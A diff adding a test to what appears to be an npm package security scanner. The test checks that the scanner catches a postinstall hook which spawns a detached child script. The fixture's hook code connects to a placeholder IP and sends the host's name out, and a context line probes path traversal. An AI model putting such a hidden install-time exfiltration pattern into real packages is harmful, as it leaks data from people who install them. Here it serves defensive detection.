@@ -690,3 +690,14 @@ def test_proxy_invalid_name_and_audit(monkeypatch):
     client = _proxy_app(monkeypatch, Verdict.SAFE)
     assert client.get("/npm/-/npm/v1/security/advisories/bulk").status_code == 404
     assert client.get("/npm/..%2Fetc").status_code in (400, 404)
+
+
+def test_detached_child_js_is_install_scope():
+    post = ("const { spawn } = require('child_process');\n"
+            "spawn('node', [`${__dirname}/main.js`], {detached: true, stdio: 'ignore'}).unref();")
+    main = ("const os = require('os'); const net = require('net');\n"
+            "const s = net.connect(9000, '198.51.100.7'); s.write(os.hostname());")
+    f = _scan({"package.json": _pkg({"postinstall": "node src/postinstall.js"}),
+               "src/postinstall.js": post, "src/main.js": main})
+    hi = [x for x in f if x.rule == "npm-install-time-exec"]
+    assert hi and hi[0].location.startswith("src/main.js")
